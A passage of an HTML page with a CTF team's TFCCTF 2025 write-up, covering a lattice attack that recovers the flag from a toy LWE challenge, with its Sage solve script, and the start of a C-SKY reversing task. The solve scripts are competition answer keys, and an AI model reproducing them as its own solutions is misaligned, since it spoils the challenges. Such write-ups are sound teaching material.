<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2025 TFCCTF SU WriteUp -</title><meta name=description content="本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2025 TFCCTF的 WriteUp。"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/tfcctf-2025-su-wu\/","name":"2025 tfcctf su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2025 TFCCTF SU WriteUp","description":"本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。\n以下是我们 SU 本次 2025 TFCCTF的 WriteUp。\n","inLanguage":"en","wordCount":12108,"datePublished":"2025-08-31T21:31:50\u002b00:00","dateModified":"2025-08-31T21:31:50\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["OtherCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/tfcctf-2025-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2025 TFCCTF SU WriteUp"><meta property="og:description" content="本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2025 TFCCTF的 WriteUp。"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/tfcctf-2025-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2025 TFCCTF SU WriteUp"><meta name=twitter:description content="本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2025 TFCCTF的 WriteUp。"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2025 TFCCTF SU WriteUp</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on August 31, 310850
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;57&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;12108&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#crypto>Crypto</a><ul><li><a href=#deez-errors>DEEZ ERRORS</a></li><li><a href=#mini-aura>MINI AURA</a></li><li><a href=#why-the-bear-has-no-tail>WHY THE BEAR HAS NO TAIL</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#slots>SLOTS</a></li><li><a href=#mucusky>MUCUSKY</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#minijail>MINIJAIL</a></li><li><a href=#πjail>ΠJAIL</a></li><li><a href=#discord-shenanigans-v5>DISCORD SHENANIGANS V5</a></li><li><a href=#blackbox>BLACKBOX</a></li><li><a href=#cr00ney>CR00NEY</a></li><li><a href=#to-rotate-or-not-to-rotate>TO ROTATE, OR NOT TO ROTATE</a></li></ul></li><li><a href=#reverse>Reverse</a><ul><li><a href=#oxidized-intentions>OXIDIZED INTENTIONS</a></li><li><a href=#scratching-machine>SCRATCHING MACHINE</a></li><li><a href=#mccrab2>MCCRAB2</a></li><li><a href=#font-leagues>FONT LEAGUES</a></li></ul></li><li><a href=#web>Web</a><ul><li><a href=#webless>WEBLESS</a></li><li><a href=#kissfixess>KISSFIXESS</a></li><li><a href=#dom-notify>DOM NOTIFY</a></li><li><a href=#slippy>SLIPPY</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_<a href=mailto:xctf@126.com>xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p><p>以下是我们 SU 本次 2025 TFCCTF的 WriteUp。</p><p><img src=/img/2025-TFCCTF/1.png alt=img></p><h1 id=crypto>Crypto</h1><h2 id=deez-errors>DEEZ ERRORS</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span><span class=p>,</span> <span class=n>bytes_to_long</span>  
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>  
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret</span> <span class=kn>import</span> <span class=n>flag</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>mod</span> <span class=o>=</span> <span class=mh>0x225fd</span>  
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>  
</span></span><span class=line><span class=cl><span class=n>e_values</span> <span class=o>=</span> <span class=p>[</span><span class=mi>97491</span><span class=p>,</span> <span class=mi>14061</span><span class=p>,</span> <span class=mi>55776</span><span class=p>]</span>  
</span></span><span class=line><span class=cl><span class=n>S</span> <span class=o>=</span> <span class=p>(</span><span class=k>lambda</span> <span class=n>f</span><span class=o>=</span><span class=p>[</span><span class=n>flag</span><span class=p>],</span> <span class=n>sk</span><span class=o>=</span><span class=p>[]:</span> <span class=p>([</span><span class=n>sk</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>f</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>%</span> <span class=n>mod</span><span class=p>)</span> <span class=ow>or</span> <span class=n>f</span><span class=o>.</span><span class=fm>__setitem__</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>f</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>//</span> <span class=n>mod</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>iter</span><span class=p>(</span><span class=k>lambda</span><span class=p>:</span> <span class=n>f</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>0</span><span class=p>)],</span><span class=n>sk</span><span class=p>)[</span><span class=mi>1</span><span class=p>])()</span>  
</span></span><span class=line><span class=cl><span class=n>S</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>GF</span><span class=p>(</span><span class=n>mod</span><span class=p>),</span> <span class=n>S</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>A_save</span> <span class=o>=</span> <span class=p>[]</span>  
</span></span><span class=line><span class=cl><span class=n>b_save</span> <span class=o>=</span> <span class=p>[]</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>52</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>A</span> <span class=o>=</span> <span class=n>VectorSpace</span><span class=p>(</span><span class=n>GF</span><span class=p>(</span><span class=n>mod</span><span class=p>),</span> <span class=mi>44</span><span class=p>)</span><span class=o>.</span><span class=n>random_element</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>e</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>e_values</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>A</span> <span class=o>*</span> <span class=n>S</span> <span class=o>+</span> <span class=n>e</span>  
</span></span><span class=line><span class=cl>    <span class=c1>#print(b)  </span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=n>A_save</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>A</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>b_save</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;out.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s1>&#39;A_values = &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>A_save</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39; ; b_values = &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>b_save</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>在这里将 flag 通过 $mod$ 进制转换为一个向量 $\pmb{s}$ 之后进行加密，根据加密的形式很显然这就是 LWE，这里的误差向量</p><div>$$
\pmb{e}\in\{97491,14061,55776\}^{52},
$$</div><p>而</p><div>$$
97491 = 55776+41715, \quad 14061=55776-41715.
$$</div><p>我们令 $d=41715$，则有：</p><div>$$
\pmb{e}=
\begin{pmatrix}
55776\\
55776\\
\vdots\\
55776
\end{pmatrix}
+
d\begin{pmatrix}
\varepsilon\_1\\
\varepsilon\_2\\
\vdots\\
\varepsilon\_{52}
\end{pmatrix}.
$$</div><p>其中 $\varepsilon_i \in {-1,0,1},,(i=1,2,\cdots,52)$，所以有：</p><div>$$
\pmb{b}=\pmb{A}\pmb{s}+\pmb{e}
=\pmb{A}\pmb{s}+
\begin{pmatrix}
55776\\
55776\\
\vdots\\
55776
\end{pmatrix}
+
d\begin{pmatrix}
\varepsilon\_1\\
\varepsilon\_2\\
\vdots\\
\varepsilon\_{52}
\end{pmatrix}.
$$</div><p>从而：</p><div>$$
\pmb{b}-
\begin{pmatrix}
55776\\
55776\\
\vdots\\
55776
\end{pmatrix}
=
\pmb{A}\pmb{s}+
d\begin{pmatrix}
\varepsilon\_1\\
\varepsilon\_2\\
\vdots\\
\varepsilon\_{52}
\end{pmatrix}.
$$</div><p>令</p><div>$$
\pmb{b}'=\pmb{b}-(55776,55776,\cdots,55776)^{T}, \quad
\pmb{\varepsilon}=(\varepsilon\_1,\varepsilon\_2,\cdots,\varepsilon\_{52})^{T},
$$</div><p>有：</p><div>$$
\pmb{b}'=\pmb{A}\pmb{s}+d\pmb{\varepsilon}.
$$</div><p>那么我们就可以将原来误差向量较大的 LWE 转换为一个误差向量中元素均在 ${-1,0,1}$ 中的 LWE：</p><div>$$
d^{-1}\pmb{b}'=d^{-1}\pmb{A}\pmb{s}+\pmb{\varepsilon}.
$$</div><p>因为 $\pmb{s}$ 较大，所以需要使用 <a href=https://triodelzx.github.io/2025/07/07/LWE/>LWE | Triode Field</a> 中提到的先求 HNF 再进行规约的方法。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># sage 10.4</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>choices</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>A_values</span> <span class=o>=</span> <span class=p>[</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>b_values</span> <span class=o>=</span> <span class=p>[</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>e_values</span> <span class=o>=</span> <span class=p>[</span><span class=mi>97491</span><span class=p>,</span> <span class=mi>14061</span><span class=p>,</span> <span class=mi>55776</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>e_values</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>-</span> <span class=n>e_values</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>mod</span> <span class=o>=</span> <span class=mh>0x225fd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>b_values</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=o>-</span> <span class=n>e_values</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>b_values</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>*</span> <span class=n>matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=n>A_values</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>*</span> <span class=n>matrix</span><span class=p>(</span><span class=n>b_values</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>b</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>B</span> <span class=o>=</span> <span class=n>block_matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=p>[[</span><span class=n>A</span><span class=o>.</span><span class=n>transpose</span><span class=p>()],</span> <span class=p>[</span><span class=n>mod</span><span class=p>]])</span>
</span></span><span class=line><span class=cl><span class=n>B_HNF</span> <span class=o>=</span> <span class=n>B</span><span class=o>.</span><span class=n>hermite_form</span><span class=p>(</span><span class=n>include_zero_rows</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=n>block_matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=p>[[</span><span class=n>B_HNF</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span> <span class=p>[</span><span class=n>b</span><span class=p>,</span> <span class=n>d</span><span class=p>]])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>L</span><span class=o>.</span><span class=n>BKZ</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>all</span><span class=p>(</span><span class=n>x</span> <span class=ow>in</span> <span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>]</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>v</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>v</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=o>-</span><span class=n>d</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>e</span> <span class=o>=</span> <span class=o>-</span><span class=n>vector</span><span class=p>(</span><span class=n>v</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>e</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>v</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>cvp</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>b</span><span class=p>)</span> <span class=o>-</span> <span class=n>e</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>AA</span> <span class=o>=</span> <span class=n>matrix</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>mod</span><span class=p>),</span> <span class=n>A</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cvp</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>mod</span><span class=p>),</span> <span class=n>cvp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>AA</span><span class=o>.</span><span class=n>solve_right</span><span class=p>(</span><span class=n>cvp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>s</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=n>flag</span> <span class=o>*</span> <span class=n>mod</span> <span class=o>+</span> <span class=n>ZZ</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>flag</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=mini-aura>MINI AURA</h2><p>csky架构最后发现只有ghidra反编译比较成功</p><p>需要安装ghidra插件</p><p><a href=https://github.com/leommxj/ghidra_csky>https://github.com/leommxj/ghidra_csky</a></p><p>反编译完直接就跳到了main而且非常清晰</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
